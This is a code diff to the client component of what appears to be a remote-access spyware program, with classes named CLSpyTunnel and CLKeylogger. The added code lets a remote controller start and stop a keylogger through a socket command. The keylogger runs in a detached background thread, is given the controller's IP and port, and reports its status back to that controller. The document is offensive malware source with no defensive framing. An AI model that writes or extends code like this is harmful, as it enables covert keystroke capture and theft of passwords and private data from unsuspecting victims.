@@ -1,5 +1,9 @@
 #include "client.hpp"
 
+void* helper_thread(void* arg) {
+    CLSpyTunnel* tunnel = static_cast<CLSpyTunnel*>(arg);
+    tunnel->run();
+}
 
 Client::Client(const char* __ip, const int __port): port_(__port), socket_(-1) {
     for (int i=0; i<MAX_IP_LEN; i++) {
@@ -88,6 +92,40 @@ void Client::start() {
                     break;
                 case KEYLOGGER:
                     printf("Received KEYLOGGER command\n");
+                    if (command_arg) {
+                        // Start the keylogger
+                        if (keylogger_ == nullptr) {
+                            keylogger_ = new CLKeylogger();
+                            // Start the keylogger in a seperate thread
+                            keylogger_->init(ip_, port_, &shutdown_flag_);
+                            pthread_t keylogger_thread;
+                            if (pthread_create(&keylogger_thread, nullptr, helper_thread, keylogger_) != 0) {
+                                printf("Error creating keylogger thread\n");
+                                delete keylogger_;
+                                keylogger_ = nullptr;
+                                retry_flag_ = send_out(socket_, EXEC_ERROR);
+                                break;
+                            } else {
+                                printf("Keylogger started\n");
+                                retry_flag_ = send_out(socket_, EXEC_SUCCESS);
+                                pthread_detach(keylogger_thread); // Detach the thread to avoid memory leaks
+                            }
+                        } else {
+                            printf("Keylogger already running\n");
+                            retry_flag_ = send_out(socket_, EXEC_ERROR);
+                        }
+                    } else {
+                        // Stop the keylogger
+                        if (keylogger_) {
+                            keylogger_->shutdown();
+                            delete keylogger_;
+                            keylogger_ = nullptr;
+                            retry_flag_ = send_out(socket_, EXEC_SUCCESS);
+                        } else {
+                            printf("Keylogger not running\n");
+                            retry_flag_ = send_out(socket_, EXEC_ERROR);
+                        }
+                    }
                     break;
                 default:
                     printf("Unknown command: %d\n", command_code);
@@ -109,4 +147,10 @@ void Client::start() {
 void Client::shutdown() {
     printf("Shutting down client\n");
     close(socket_);
+
+    if (keylogger_) {
+        keylogger_->shutdown();
+        delete keylogger_;
+        keylogger_ = nullptr;
+    }
 }
